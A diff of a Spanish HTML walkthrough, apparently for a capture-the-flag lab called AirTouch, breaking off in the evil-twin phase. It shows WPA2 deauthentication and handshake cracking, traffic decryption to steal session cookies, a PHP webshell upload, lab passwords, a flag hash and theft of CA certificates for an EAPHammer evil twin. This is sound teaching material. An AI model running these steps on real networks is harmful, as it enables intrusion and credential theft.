-          La cadena de explotación se divide en 6 fases progresivas, desde la captura del handshake WPA2 hasta la obtención de la flag root en el servidor remoto <code style="font-family:monospace;color:var(--accent)">10.10.10.1</code>.
-        </p>
-
-        <div class="timeline">
-          <div class="tl-item">
-            <div class="tl-dot red"></div>
-            <div class="tl-time">FASE 1 — AirTouch-Internet</div>
-            <div class="tl-title">📡 Captura de Handshake WPA2-PSK</div>
-            <div class="tl-desc">airodump-ng captura el handshake de <strong style="color:var(--orange)">AirTouch-Internet</strong> (BSSID F0:9F:C2:A3:F1:A7, ch 6) tras deautenticar al cliente. aircrack-ng crackea la contraseña: <strong style="color:var(--accent)">challenge</strong>.</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot yellow"></div>
-            <div class="tl-time">FASE 2 — Descifrado de tráfico</div>
-            <div class="tl-title">🔓 Descifrado WPA con airdecap-ng + Extracción de Cookies</div>
-            <div class="tl-desc">Se captura tráfico HTTP mientras el cliente navega por el router interno. airdecap-ng descifra el .cap usando la PSK. Se extraen cookies de sesión PHP: <strong style="color:var(--accent)">PHPSESSID</strong> y <strong style="color:var(--accent)">UserRole=admin</strong>.</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot blue"></div>
-            <div class="tl-time">FASE 3 — Router 192.168.3.1</div>
-            <div class="tl-title">🌐 Explotación de Upload PHP en el Router</div>
-            <div class="tl-desc">Con las cookies de sesión se accede a la función de carga de archivos del router. Se sube un webshell <code style="font-family:monospace;color:var(--accent)">.phtml</code> que permite RCE. Se leen credenciales hardcodeadas en <code style="font-family:monospace;color:var(--accent)">/var/www/html/login.php</code>.</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot purple"></div>
-            <div class="tl-time">FASE 4 — Usuario del router</div>
-            <div class="tl-title">🏳️ User Flag + Certificados SSL</div>
-            <div class="tl-desc">SSH al router como <code style="font-family:monospace;color:var(--accent)">user:JunDRDZKHDnpkpDDvay</code> via túnel SSH. Se obtiene la <strong style="color:var(--accent)">user flag</strong>. Se extraen los certificados CA de AirTouch: <code style="font-family:monospace;color:var(--accent)">ca.crt</code>, <code style="font-family:monospace;color:var(--accent)">server.crt</code>, <code style="font-family:monospace;color:var(--accent)">server.key</code>.</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot orange"></div>
-            <div class="tl-time">FASE 5 — AirTouch-Office (5GHz, ch 44)</div>
-            <div class="tl-title">📶 Evil Twin WPA2-Enterprise + Captura MSCHAPv2</div>
-            <div class="tl-desc">EAPHammer configurado con los certs de AirTouch en <code style="font-family:monospace;color:var(--accent)">wlan6</code> (canal 44). Deauth continuo contra ambos APs reales. El cliente conecta al Evil Twin y expone el hash MSCHAPv2 de <strong style="color:var(--accent)">AirTouch\r4ulcl</strong>. John crackea: <strong style="color:var(--accent)">laboratory</strong>.</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot cyan"></div>
-            <div class="tl-time">FASE 6 — Servidor remoto 10.10.10.1</div>
-            <div class="tl-title">🏴 Root Flag</div>
-            <div class="tl-desc">Conexión a AirTouch-Office con credenciales crackeadas. SSH a 10.10.10.1 como <code style="font-family:monospace;color:var(--accent)">remote</code>. Se lee <code style="font-family:monospace;color:var(--accent)">/etc/hostapd/hostapd_wpe.eap_user</code> que contiene creds de admin. SSH como admin → sudo -i → <strong style="color:var(--green)">root flag</strong>.</div>
-          </div>
-        </div>
-      </section>
-
-      <!-- 4. Fase 1-2: WPA2 -->
-      <section class="section" id="wpa2">
-        <div class="section-header">
-          <div class="section-number">4</div>
-          <h2>Fases 1 &amp; 2 — Handshake WPA2 y Descifrado de Tráfico</h2>
-        </div>
-        <p>
-          La primera red objetivo es <strong>AirTouch-Internet</strong>, una red WPA2-PSK en canal 6. La estrategia consiste en capturar el 4-way handshake mientras un cliente se reconecta (tras un ataque de deautenticación), crackear la PSK con diccionario y luego descifrar el tráfico capturado para extraer credenciales HTTP.
-        </p>
-
-        <div class="callout callout-info">
-          <span class="callout-icon">💡</span>
-          <div class="callout-content">
-            <strong>¿Por qué funciona el ataque al handshake WPA2?</strong> El 4-way handshake WPA2 contiene el MIC (Message Integrity Code), derivado de la PSK y un nonce aleatorio. Este MIC puede verificarse offline: si probamos una contraseña candidata y el MIC calculado coincide con el capturado, hemos encontrado la PSK. No se requiere acceso activo a la red durante el crackeo.
-          </div>
-        </div>
-
-        <div class="card">
-          <h3>📡 Captura del Handshake WPA2-PSK</h3>
-          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
+<p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
             wlan0mon (monitor, phy0) se usa para captura pasiva. wlan1 (managed, phy1) se usa para inyección de frames de deauthenticación, ya que está en la misma red y puede inyectar frames 802.11.
           </p>
-          <div class="code-block">
-            <div class="code-label">💻 <span>Terminal 1 — Captura dirigida al AP objetivo</span></div>
-            <div class="code-body">
+
+
+<div class="code-block">
+<div class="code-label">💻 <span>Terminal 1 — Captura dirigida al AP objetivo</span></div>
+<div class="code-body">
 <span class="comment"># Verificar estado de wlan0mon (debe estar en modo monitor)</span>
 <span class="cmd">iw dev</span> wlan0mon info
 <span class="comment"># Interface wlan0mon  type monitor  wiphy 0  channel 6</span>
-
 <span class="comment"># Captura dirigida: solo BSSID F0:9F:C2:A3:F1:A7, canal 6</span>
 <span class="cmd">airodump-ng</span> <span class="param">--bssid</span> <span class="ip">F0:9F:C2:A3:F1:A7</span> <span class="param">--channel 6</span> \
              <span class="param">-w /tmp/fresh --output-format cap</span> wlan0mon
@@ -424,11 +173,13 @@
 <span class="comment"># F0:9F:C2:A3:F1:A7  -28  90      115      4   6  AirTouch-Internet</span>
 <span class="comment"># STATION            PWR  Rate  Lost  Frames  Probe</span>
 <span class="comment"># 28:6C:07:FE:A3:22  -29  54e   0     12</span>
-            </div>
-          </div>
-          <div class="code-block">
-            <div class="code-label">💻 <span>Terminal 2 — Deauth para forzar reconexión del cliente</span></div>
-            <div class="code-body">
+</div>
+</div>
+
+
+<div class="code-block">
+<div class="code-label">💻 <span>Terminal 2 — Deauth para forzar reconexión del cliente</span></div>
+<div class="code-body">
 <span class="comment"># Enviar 10 frames de deauthenticación al broadcast del AP</span>
 <span class="comment"># --ignore-negative-one: ignorar error de canal negativo (mac80211_hwsim)</span>
 <span class="cmd">aireplay-ng</span> <span class="param">--ignore-negative-one -0 10</span> \
@@ -437,19 +188,19 @@
 
 <span class="comment"># Salida:</span>
 <span class="comment"># Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [0|0 ACKs]</span>
-
 <span class="comment"># En Terminal 1 aparece inmediatamente:</span>
 <span class="comment"># CH  6 ][ WPA handshake: F0:9F:C2:A3:F1:A7  &lt;-- ¡CAPTURADO!</span>
-            </div>
-          </div>
-          <div class="code-block">
-            <div class="code-label">💻 <span>Verificación y crackeo del handshake</span></div>
-            <div class="code-body">
+</div>
+</div>
+
+
+<div class="code-block">
+<div class="code-label">💻 <span>Verificación y crackeo del handshake</span></div>
+<div class="code-body">
 <span class="comment"># Verificar handshake capturado</span>
 <span class="cmd">aircrack-ng</span> /tmp/fresh-01.cap
 <span class="comment">#   Index  BSSID              ESSID                Encryption</span>
 <span class="comment">#   1      F0:9F:C2:A3:F1:A7  AirTouch-Internet    WPA (1 handshake)</span>
-
 <span class="comment"># Crackeo con wordlist rockyou.txt</span>
 <span class="cmd">aircrack-ng</span> <span class="param">-w</span> <span class="path">/root/eaphammer/wordlists/rockyou.txt</span> \
             <span class="param">-b</span> <span class="ip">F0:9F:C2:A3:F1:A7</span> /tmp/fresh-01.cap
@@ -460,29 +211,34 @@
 <span class="success">#                           KEY FOUND! [ challenge ]</span>
 <span class="comment"># Master Key     : 3C 45 A1 F2 ... (32 bytes)</span>
 <span class="comment"># Transient Key  : 78 0A BA 43 ... (64 bytes)</span>
-            </div>
-          </div>
-        </div>
+</div>
+</div>
 
-        <div class="card">
-          <h3>🔓 Descifrado de Tráfico HTTP con airdecap-ng</h3>
-          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>🔓 Descifrado de Tráfico HTTP con airdecap-ng</h2></div>
+      
+
+<p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
             Con la PSK conocida (<code style="font-family:monospace;color:var(--accent)">challenge</code>), airdecap-ng puede descifrar todos los frames WPA2 capturados. El cliente simulado navega periódicamente por el router <code style="font-family:monospace;color:var(--accent)">192.168.3.1</code>, dejando su sesión HTTP en el tráfico.
           </p>
-          <div class="code-block">
-            <div class="code-label">💻 <span>Captura de tráfico del cliente + descifrado</span></div>
-            <div class="code-body">
+
+
+<div class="code-block">
+<div class="code-label">💻 <span>Captura de tráfico del cliente + descifrado</span></div>
+<div class="code-body">
 <span class="comment"># 1. Conectar wlan1 a AirTouch-Internet</span>
-<span class="cmd">wpa_passphrase</span> "AirTouch-Internet" "challenge" > /tmp/internet.conf
+<span class="cmd">wpa_passphrase</span> "AirTouch-Internet" "challenge" &gt; /tmp/internet.conf
 <span class="cmd">wpa_supplicant</span> <span class="param">-B -i</span> wlan1 <span class="param">-c</span> /tmp/internet.conf
 <span class="comment"># Successfully initialized wpa_supplicant</span>
 <span class="cmd">dhclient</span> wlan1
 <span class="cmd">ip addr show</span> wlan1
 <span class="success"># inet 192.168.3.100/24 brd 192.168.3.255 scope global dynamic wlan1</span>
-
 <span class="comment"># 2. Capturar tráfico completo del canal durante ~3 minutos</span>
 <span class="cmd">airodump-ng</span> <span class="param">--bssid</span> <span class="ip">F0:9F:C2:A3:F1:A7</span> <span class="param">--channel 6</span> \
-             <span class="param">-w /tmp/fresh --output-format cap</span> wlan0mon &
+             <span class="param">-w /tmp/fresh --output-format cap</span> wlan0mon &amp;
 
 <span class="comment"># 3. Descifrar la captura con la PSK crackeada</span>
 <span class="cmd">airdecap-ng</span> <span class="param">-e</span> "AirTouch-Internet" <span class="param">-p</span> "challenge" /tmp/fresh-01.cap
@@ -492,23 +248,23 @@
 <span class="success"># Number of packets with bad TKIP MIC      0</span>
 <span class="success"># Number of decrypted WPA  packets        34</span>
 <span class="comment"># Output: /tmp/fresh-01-dec.cap</span>
-            </div>
-          </div>
-          <div class="code-block">
-            <div class="code-label">💻 <span>Extracción de cookies de sesión HTTP</span></div>
-            <div class="code-body">
+</div>
+</div>
+
+
+<div class="code-block">
+<div class="code-label">💻 <span>Extracción de cookies de sesión HTTP</span></div>
+<div class="code-body">
 <span class="comment"># Buscar cookies PHP en el tráfico descifrado</span>
 <span class="cmd">strings</span> /tmp/fresh-01-dec.cap <span class="param">| grep -i</span> "cookie\|PHPSESSID\|UserRole"
 
 <span class="success"># Cookie: PHPSESSID=0545q2iqf5beqnd5jec9qqboc1; UserRole=user</span>
 <span class="comment"># El cliente navega como "user" — necesitamos admin</span>
-
 <span class="comment"># Extraer también tráfico HTTP completo para ver estructura de la app</span>
 <span class="cmd">strings</span> /tmp/fresh-01-dec.cap <span class="param">| grep -i</span> "POST\|GET\|HTTP\|login\|upload"
 <span class="comment"># GET /login.php HTTP/1.1</span>
 <span class="comment"># POST /login.php HTTP/1.1</span>
 <span class="comment"># GET /dashboard.php HTTP/1.1</span>
-
 <span class="comment"># La sesión es válida pero con UserRole=user</span>
 <span class="comment"># Reutilizamos el PHPSESSID pero cambiamos UserRole=admin en el navegador</span>
 <span class="comment"># O directamente con curl:</span>
@@ -516,63 +272,69 @@
      "http://127.0.0.1:4444/index.php" <span class="param">| grep -i</span> "upload\|file"
 <span class="success"># &lt;form enctype="multipart/form-data" action="index.php" method="POST"&gt;</span>
 <span class="success"># &lt;input type="file" name="fileToUpload"&gt;</span>
+</div>
+</div>
+
+
+<div class="callout callout-tip">
+<span class="callout-icon">💡</span>
+<div class="callout-content">
+<strong>Alternativa con Wireshark:</strong> Abrir fresh-01.cap en Wireshark → Edit → Preferences → Protocols → IEEE 802.11 → Decryption Keys → añadir tipo <code style="font-family:monospace;color:var(--accent)">wpa-pwd</code> con valor <code style="font-family:monospace;color:var(--accent)">challenge:AirTouch-Internet</code>. Luego filtrar por <code style="font-family:monospace;color:var(--accent)">http</code> y buscar el POST de login con las cookies en "HTML Form URL Encoded".
             </div>
-          </div>
+</div>
 
-          <div class="callout callout-tip">
-            <span class="callout-icon">💡</span>
-            <div class="callout-content">
-              <strong>Alternativa con Wireshark:</strong> Abrir fresh-01.cap en Wireshark → Edit → Preferences → Protocols → IEEE 802.11 → Decryption Keys → añadir tipo <code style="font-family:monospace;color:var(--accent)">wpa-pwd</code> con valor <code style="font-family:monospace;color:var(--accent)">challenge:AirTouch-Internet</code>. Luego filtrar por <code style="font-family:monospace;color:var(--accent)">http</code> y buscar el POST de login con las cookies en "HTML Form URL Encoded".
-            </div>
-          </div>
-        </div>
-      </section>
 
-      <!-- 5. Fase 3-4: Router Web + User Flag -->
-      <section class="section" id="router">
-        <div class="section-header">
-          <div class="section-number">5</div>
-          <h2>Fases 3 &amp; 4 — Explotación del Router + User Flag</h2>
-        </div>
-        <p>
-          Con la PSK crackeada, <code style="font-family:monospace;color:var(--accent)">wlan1</code> obtiene IP en la red interna <code style="font-family:monospace;color:var(--accent)">192.168.3.0/24</code>. El router <code style="font-family:monospace;color:var(--accent)">192.168.3.1</code> expone una aplicación web PHP con autenticación por cookie. Usando las cookies extraídas del tráfico descifrado (con UserRole modificado a admin), se accede a la función de upload y se ejecuta código remoto.
-        </p>
+    </div>
 
-        <div class="card">
-          <h3>🌐 Tunnel SSH y Enumeración del Router</h3>
-          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Fases 3 & 4 — Explotación del Router + User Flag</h2></div>
+      
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>🌐 Tunnel SSH y Enumeración del Router</h2></div>
+      
+
+<p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
             El router solo es accesible desde la red 192.168.3.0/24 (a la que accedemos via wlan1). Para operar desde Kali, se establece un túnel SSH a través de la máquina consultor.
           </p>
-          <div class="code-block">
-            <div class="code-label">💻 <span>Desde Kali — tunnel SSH al puerto 80 del router</span></div>
-            <div class="code-body">
+
+
+<div class="code-block">
+<div class="code-label">💻 <span>Desde Kali — tunnel SSH al puerto 80 del router</span></div>
+<div class="code-body">
 <span class="comment"># Túnel: localhost:4444 → 192.168.3.1:80 via consultant</span>
 <span class="cmd">sshpass -p</span> 'RxBlZhLmOkacNWScmZ6D' <span class="cmd">ssh</span> <span class="param">-f -N -L 4444:192.168.3.1:80</span> \
        <span class="user">consultant</span>@<span class="ip">10.129.3.94</span>
-
 <span class="comment"># Verificar acceso al router</span>
 <span class="cmd">curl</span> <span class="param">-s</span> http://127.0.0.1:4444/login.php <span class="param">| head -5</span>
 <span class="comment"># &lt;!DOCTYPE html&gt;</span>
 <span class="comment"># &lt;title&gt;AirTouch Router — Login&lt;/title&gt;</span>
-
 <span class="comment"># Escanear puertos del router desde la red interna</span>
 <span class="cmd">nmap</span> <span class="param">-sV -p 22,80,443,8080</span> <span class="ip">192.168.3.1</span>
 <span class="comment"># 22/tcp  open  ssh     OpenSSH 8.2p1</span>
 <span class="comment"># 80/tcp  open  http    Apache httpd 2.4.41</span>
-            </div>
-          </div>
-        </div>
+</div>
+</div>
 
-        <div class="card">
-          <h3>🔼 File Upload sin restricción → Webshell RCE</h3>
-          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>🔼 File Upload sin restricción → Webshell RCE</h2></div>
+      
+
+<p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
             La aplicación web solo verifica la cookie <code style="font-family:monospace;color:var(--accent)">UserRole=admin</code> para mostrar el formulario de upload. No valida la extensión del archivo subido, permitiendo subir archivos <code style="font-family:monospace;color:var(--accent)">.phtml</code> que PHP ejecuta como código.
           </p>
-          <div class="code-block">
-            <div class="code-label">💻 <span>Crear webshell y subir al router</span></div>
-            <div class="code-body">
+
+
+<div class="code-block">
+<div class="code-label">💻 <span>Crear webshell y subir al router</span></div>
+<div class="code-body">
 <span class="comment"># 1. Crear webshell PHP con extensión .phtml (ejecutable por Apache)</span>
-<span class="cmd">echo</span> '&lt;?php system($_GET["c"]); ?&gt;' > /tmp/shell.phtml
+<span class="cmd">echo</span> '&lt;?php system($_GET["c"]); ?&gt;' &gt; /tmp/shell.phtml
 
 <span class="comment"># 2. Subir el webshell usando la cookie de admin</span>
 <span class="cmd">curl</span> <span class="param">-b</span> "PHPSESSID=0545q2iqf5beqnd5jec9qqboc1;UserRole=admin" \
@@ -581,54 +343,56 @@
      http://127.0.0.1:4444/index.php
 <span class="success"># File uploaded successfully.</span>
 <span class="comment"># Archivo almacenado en: /var/www/html/uploads/shell.phtml</span>
-
 <span class="comment"># 3. Verificar RCE</span>
 <span class="cmd">curl</span> <span class="param">-b</span> "PHPSESSID=0545q2iqf5beqnd5jec9qqboc1;UserRole=admin" \
      "http://127.0.0.1:4444/uploads/shell.phtml?c=id"
 <span class="success"># uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
-
 <span class="comment"># 4. Leer archivos del sistema con file reader</span>
-<span class="cmd">echo</span> '&lt;?php echo file_get_contents($_GET["file"]); ?&gt;' > /tmp/reader.phtml
+<span class="cmd">echo</span> '&lt;?php echo file_get_contents($_GET["file"]); ?&gt;' &gt; /tmp/reader.phtml
 <span class="comment"># (Subir del mismo modo)</span>
-
 <span class="comment"># 5. Leer credenciales hardcodeadas en login.php</span>
 <span class="cmd">curl</span> <span class="param">-b</span> "PHPSESSID=0545q2iqf5beqnd5jec9qqboc1;UserRole=admin" \
      "http://127.0.0.1:4444/uploads/reader.phtml?file=/var/www/html/login.php"
             </div>
-          </div>
-          <div class="code-block">
-            <div class="code-label">📄 <span>Contenido de login.php — credenciales encontradas</span></div>
-            <div class="code-body">
+</div>
+
+
+<div class="code-block">
+<div class="code-label">📄 <span>Contenido de login.php — credenciales encontradas</span></div>
+<div class="code-body">
 <span class="comment"># Extracto relevante de login.php:</span>
 $logins = array(
   <span class="comment">/* 'user' =&gt; array('password' =&gt; 'JunDRDZKHDnpkpDDvay', 'role' =&gt; 'admin') */</span>
-  <span class="highlight">'user'</span>    =&gt; array('password' =&gt; <span class="success">'JunDRDZKHDnpkpDDvay'</span>, 'role' =&gt; 'admin'),
+<span class="highlight">'user'</span>    =&gt; array('password' =&gt; <span class="success">'JunDRDZKHDnpkpDDvay'</span>, 'role' =&gt; 'admin'),
   <span class="highlight">'manager'</span> =&gt; array('password' =&gt; <span class="success">'2wLFYNh4TSTgA5sNgT4'</span>, 'role' =&gt; 'user')
 );
             </div>
-          </div>
-        </div>
+</div>
 
-        <div class="card">
-          <h3>🏳️ User Flag + Extracción de Certificados SSL</h3>
-          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>🏳️ User Flag + Extracción de Certificados SSL</h2></div>
+      
+
+<p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
             Con las credenciales SSH del router, obtenemos acceso interactivo via otro túnel SSH. En <code style="font-family:monospace;color:var(--accent)">/root</code> encontramos la user flag, el script <code style="font-family:monospace;color:var(--accent)">send_certs.sh</code> con credenciales del servidor remoto, y los certificados CA de AirTouch imprescindibles para el Evil Twin.
           </p>
-          <div class="code-block">
-            <div class="code-label">💻 <span>SSH al router + user flag + certs</span></div>
-            <div class="code-body">
+
+
+<div class="code-block">
+<div class="code-label">💻 <span>SSH al router + user flag + certs</span></div>
+<div class="code-body">
 <span class="comment"># Abrir tunnel SSH al puerto 22 del router</span>
 <span class="cmd">sshpass -p</span> 'RxBlZhLmOkacNWScmZ6D' <span class="cmd">ssh</span> <span class="param">-f -N -L 2222:192.168.3.1:22</span> \
        <span class="user">consultant</span>@<span class="ip">10.129.3.94</span>
-
 <span class="comment"># Entrar al router como user</span>
 <span class="cmd">sshpass -p</span> 'JunDRDZKHDnpkpDDvay' <span class="cmd">ssh</span> <span class="param">-p 2222</span> <span class="user">user</span>@localhost
-<span class="cmd">sudo -i</span>   <span class="comment"># user tiene sudo sin contraseña</span>
-
+<span class="cmd">sudo -i</span> <span class="comment"># user tiene sudo sin contraseña</span>
 <span class="comment"># User Flag</span>
 <span class="cmd">cat</span> usuario.txt
 <span class="success"># 3409777db07f2c8da0f3bdf40fcf0890</span>
-
 <span class="comment"># Descubrir credenciales del servidor remoto 10.10.10.1</span>
 <span class="cmd">cat</span> <span class="path">/root/send_certs.sh</span>
 <span class="comment">#!/bin/bash</span>
@@ -642,7 +406,6 @@ sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$R
 <span class="comment"># Certificados SSL de AirTouch (necesarios para Evil Twin válido)</span>
 <span class="cmd">ls</span> <span class="path">/root/certs-backup/</span>
 <span class="comment"># ca.crt  ca.conf  server.crt  server.csr  server.conf  server.ext  server.key</span>
-
 <span class="comment"># Copiar certs a la máquina consultor (via base64 para evitar problemas de SCP)</span>
 <span class="comment"># En la máquina consultor, como root:</span>
 <span class="cmd">./eaphammer</span> <span class="param">--cert-wizard import</span> \
@@ -650,605 +413,134 @@ sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$R
   <span class="param">--ca-cert</span> ca.crt \
   <span class="param">--private-key</span> server.key
 <span class="success"># [*] Certs imported to /root/eaphammer/certs/active/fullchain.pem</span>
-            </div>
-          </div>
+</div>
+</div>
 
-          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:14px;">
-            <div class="artifact-card">
-              <span class="artifact-icon">🔑</span>
-              <div>
-                <div class="artifact-name">ca.crt — CA raíz AirTouch</div>
-                <div class="artifact-desc">Certificado de la Autoridad Certificadora interna de AirTouch. Los clientes WiFi confían en esta CA para validar servidores EAP. Con él, nuestro Evil Twin presentará un certificado válido y los clientes no detectarán la suplantación.</div>
-              </div>
-            </div>
-            <div class="artifact-card">
-              <span class="artifact-icon">📜</span>
-              <div>
-                <div class="artifact-name">server.crt + server.key</div>
-                <div class="artifact-desc">Certificado de servidor y clave privada firmados por la CA de AirTouch. EAPHammer los usa para presentar un certificado TLS legítimo durante el handshake PEAP, lo que hace que los clientes completen la autenticación EAP.</div>
-              </div>
-            </div>
-          </div>
-        </div>
 
-        <div class="callout callout-warn">
-          <span class="callout-icon">⚠️</span>
-          <div class="callout-content">
-            <strong>Problema — EAPHammer 1.14 crash con input():</strong> Al ejecutar EAPHammer en background con <code style="font-family:monospace;color:var(--accent)">nohup</code>, la función <code style="font-family:monospace;color:var(--accent)">input('\n\nPress enter to quit...\n\n')</code> lanza <code style="font-family:monospace;color:var(--accent)">EOFError</code> porque stdin no está disponible. Parche necesario antes de continuar:
-            <br><br>
-            <code style="font-family:monospace;color:var(--accent)">sed -i "s/input.*Press enter to quit.*/import time; time.sleep(3600)/" /root/eaphammer/eaphammer</code>
-            <br><br>
-            Este parche reemplaza todos los <code style="font-family:monospace;color:var(--accent)">input()</code> en el código por un sleep de 1 hora, manteniendo el proceso vivo en background sin requerir interacción.
-          </div>
-        </div>
-      </section>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:14px;">
+<div class="artifact-card">
+<span class="artifact-icon">🔑</span>
+<div>
+<div class="artifact-name">ca.crt — CA raíz AirTouch</div>
+<div class="artifact-desc">Certificado de la Autoridad Certificadora interna de AirTouch. Los clientes WiFi confían en esta CA para validar servidores EAP. Con él, nuestro Evil Twin presentará un certificado válido y los clientes no detectarán la suplantación.</div>
+</div>
+</div>
+<div class="artifact-card">
+<span class="artifact-icon">📜</span>
+<div>
+<div class="artifact-name">server.crt + server.key</div>
+<div class="artifact-desc">Certificado de servidor y clave privada firmados por la CA de AirTouch. EAPHammer los usa para presentar un certificado TLS legítimo durante el handshake PEAP, lo que hace que los clientes completen la autenticación EAP.</div>
+</div>
+</div>
+</div>
 
-      <!-- 6. Fase 5: Evil Twin EAP -->
-      <section class="section" id="eviltwin">
-        <div class="section-header">
-          <div class="section-number">6</div>
-          <h2>Fase 5 — Evil Twin WPA2-Enterprise (AirTouch-Office)</h2>
-        </div>
-        <p>
-          La fase más compleja del reto. Los APs reales de AirTouch-Office operan en <strong>canal 44 (5GHz)</strong>, no en 2.4GHz. El Evil Twin debe usar un BSSID único (sin colisión con los APs reales) y deautenticar continuamente a los clientes de los APs reales para forzar su conexión al AP falso.
-        </p>
 
-        <div class="callout callout-danger">
-          <span class="callout-icon">🚨</span>
-          <div class="callout-content">
-            <strong>Error crítico — Colisión de BSSID en mac80211_hwsim:</strong> Si el Evil Twin usa el mismo BSSID que el AP real (<code style="font-family:monospace;color:var(--accent)">AC:8B:A9:AA:3F:D2</code>), en el entorno virtualizado mac80211_hwsim los frames EAPOL unicast del cliente se enrutan al AP real (en el contenedor Docker sibling). Resultado: los EAPOL-Response llegan al AP real, no al nuestro. Nuestro hostapd solo ve ACKs de capa 2 pero nunca recibe la respuesta EAP. <strong>Solución definitiva: BSSID único + deauth continuo.</strong>
-          </div>
-        </div>
+    </div>
 
-        <div class="card">
-          <h3>🔬 Diagnóstico — ¿Por qué fallan los primeros intentos?</h3>
-          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Fase 5 — Evil Twin WPA2-Enterprise (AirTouch-Office)</h2></div>
+      
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>🔬 Diagnóstico — ¿Por qué fallan los primeros intentos?</h2></div>
+      
+
+<p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">
             Durante la resolución se probaron varias configuraciones incorrectas antes de encontrar la solución. Es importante entender cada error.
           </p>
 
-          <div class="callout callout-warn" style="margin-bottom:10px;">
-            <span class="callout-icon">⚠️</span>
-            <div class="callout-content">
-              <strong>Error 1 — Canal incorrecto (6 en lugar de 44):</strong> El primer intento usó canal 6 porque el escaneo inicial con wlan0mon (solo 2.4GHz) no reveló los APs de 5GHz. Los clientes probeaban nuestra AP en canal 6 pero NO autenticaban porque estaban conectados a los APs reales en canal 44. Solución: <code style="font-family:monospace;color:var(--accent)">airodump-ng --band abg</code> para escanear también 5GHz.
+
+<div class="callout callout-warn" style="margin-bottom:10px;">
+<span class="callout-icon">⚠️</span>
+<div class="callout-content">
+<strong>Error 1 — Canal incorrecto (6 en lugar de 44):</strong> El primer intento usó canal 6 porque el escaneo inicial con wlan0mon (solo 2.4GHz) no reveló los APs de 5GHz. Los clientes probeaban nuestra AP en canal 6 pero NO autenticaban porque estaban conectados a los APs reales en canal 44. Solución: <code style="font-family:monospace;color:var(--accent)">airodump-ng --band abg</code> para escanear también 5GHz.
             </div>
-          </div>
-          <div class="callout callout-warn" style="margin-bottom:10px;">
-            <span class="callout-icon">⚠️</span>
-            <div class="callout-content">
-              <strong>Error 2 — Colisión de BSSID:</strong> Al usar <code style="font-family:monospace;color:var(--accent)">-b AC:8B:A9:AA:3F:D2</code> (mismo BSSID que el AP real), los clientes SÍ se asociaban pero los frames EAPOL-Response iban al AP real en el otro contenedor. Síntoma: <code style="font-family:monospace;color:var(--accent)">TX status ack=1</code> (el cliente recibe nuestra petición EAP) pero nunca llega la respuesta. Solo <code style="font-family:monospace;color:var(--accent)">CTRL-EVENT-EAP-RETRANSMIT</code> y timeout.
+</div>
+
+
+<div class="callout callout-warn" style="margin-bottom:10px;">
+<span class="callout-icon">⚠️</span>
+<div class="callout-content">
+<strong>Error 2 — Colisión de BSSID:</strong> Al usar <code style="font-family:monospace;color:var(--accent)">-b AC:8B:A9:AA:3F:D2</code> (mismo BSSID que el AP real), los clientes SÍ se asociaban pero los frames EAPOL-Response iban al AP real en el otro contenedor. Síntoma: <code style="font-family:monospace;color:var(--accent)">TX status ack=1</code> (el cliente recibe nuestra petición EAP) pero nunca llega la respuesta. Solo <code style="font-family:monospace;color:var(--accent)">CTRL-EVENT-EAP-RETRANSMIT</code> y timeout.
             </div>
-          </div>
-          <div class="callout callout-warn">
-            <span class="callout-icon">⚠️</span>
-            <div class="callout-content">
-              <strong>Error 3 — Usar wlan4mon (monitor) como interfaz AP:</strong> El writeup referencia <code style="font-family:monospace;color:var(--accent)">wlan4mon</code> pero EAPHammer requiere una interfaz en modo managed para convertirla a AP. wlan4mon al estar en monitor mode causa <code style="font-family:monospace;color:var(--accent)">nl80211 driver initialization failed</code>. Usar wlan5 o wlan6 (managed) en su lugar.
+</div>
+
+
+<div class="callout callout-warn">
+<span class="callout-icon">⚠️</span>
+<div class="callout-content">
+<strong>Error 3 — Usar wlan4mon (monitor) como interfaz AP:</strong> El writeup referencia <code style="font-family:monospace;color:var(--accent)">wlan4mon</code> pero EAPHammer requiere una interfaz en modo managed para convertirla a AP. wlan4mon al estar en monitor mode causa <code style="font-family:monospace;color:var(--accent)">nl80211 driver initialization failed</code>. Usar wlan5 o wlan6 (managed) en su lugar.
             </div>
-          </div>
-        </div>
+</div>
 
-        <div class="code-block">
-          <div class="code-label">💻 <span>Paso 1 — Descubrir APs reales en 5GHz canal 44</span></div>
-          <div class="code-body">
-<span class="comment"># Escaneo completo: 2.4GHz + 5GHz con wlan4mon en modo monitor</span>
-<span class="cmd">timeout 35 airodump-ng</span> <span class="param">--band abg --output-format csv -w /tmp/scan5g</span> wlan4mon
 
-<span class="comment"># Resultado del CSV — APs reales AirTouch-Office en canal 44:</span>
